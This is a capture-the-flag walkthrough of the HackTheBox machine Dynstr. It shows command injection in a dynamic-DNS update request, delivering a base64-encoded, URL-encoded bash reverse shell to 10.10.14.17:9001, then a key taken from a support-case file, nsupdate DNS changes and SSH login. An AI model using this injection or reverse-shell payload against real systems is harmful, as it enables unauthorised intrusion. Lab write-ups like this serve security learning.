# user
starting off with the example code from noip.com

````bash
GET /nic/update?hostname=mytest.example.com&myip=192.0.2.25 HTTP/1.1
Host: dynupdate.no-ip.com
Authorization: Basic base64-encoded-auth-string
User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com
````

the code is modified to meet the current box
![no-ip.htb referece](DYNSTR.HTB-19.png#center)
<div class="myprediv">
	
GET /nic/update?hostname=<span class="myYellow">qdada.no-ip</span>.htb&myip=<span class="myYellow">10.10.10.244</span> HTTP/1.1
Host: <span class="myYellow">dyna.htb</span>
Authorization: Basic <span class="myYellow">ZHluYWRuczpzbmRhbnlkCg</span>
User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com
	
</div>

<HR>

## rce

This update application is vulnerable to command injection.
- make a bash reverse shell one-liner into base64
- enclose in back-ticks and insert immediatley after the hostname parameter

![base64 reverse shell](DYNSTR.HTB-20.png#center)

````bash
GET /nic/update?hostname=qdada.no-ip.htb&myip=10.10.10.244 HTTP/1.1
Host: dyna.htb
Authorization: Basic ZHluYWRuczpzbmRhbnlk
User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com


echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNy85MDAxIDA+JjEK" | base64 -d | bash
#urlencode to :
echo%20%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNy85MDAxIDA%2BJjEK%22%20%7C%20base64%20-d%20%7C%20bash

````

URL encode and inject into request.

![code injection](DYNSTR.HTB-21.png#center)

header now looks like this

````bash
GET /nic/update?hostname=%60echo%20%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNy85MDAxIDA%2BJjEK%22%20%7C%20base64%20-d%20%7C%20bash%60qdada.no-ip.htb&myip=10.10.10.244 HTTP/1.1
Host: dyna.htb
Authorization: Basic ZHluYWRuczpzbmRhbnlk
User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com
````
reverse shell

![reverse shell](DYNSTR.HTB-22.gif#center)

on /home/bindmgr <span class="myYellow" style="font-wight:bold;">support-case-C62796521</span> is accessible

![accessible folder](DYNSTR.HTB-23.png#center)

in that folder, <span class="myYellow" style="font-wight:bold;">strace-C62796521.txt</span> contains a key

![](DYNSTR.HTB-24.png#center)	
![](DYNSTR.HTB-26.png#center)
	
the zone needs to be updated in order to logon by ssh.

<div class="myprediv">
nsupdate -k /etc/bind/<span class="myYellow" style="font-wight:bold;">infra</span>.key
	[ENTER]
update add <span class="myYellow" style="font-wight:bold;">test.infra</span>.dyna.htb 86400 A 10.10.14.17
	[ENTER]
update add 17.14.10.10.in.addr.apra 86400 PTR <span class="myYellow" style="font-wight:bold;">test.intra</span>.dyna.htb
	[ENTER]
	[ENTER]
&nbsp;
</div>

![](DYNSTR.HTB-27.gif)
After this part login with the key
	
````bash
ssh -i key bindmgr@10.10.10.244
````
![](DYNSTR.HTB-28.png)
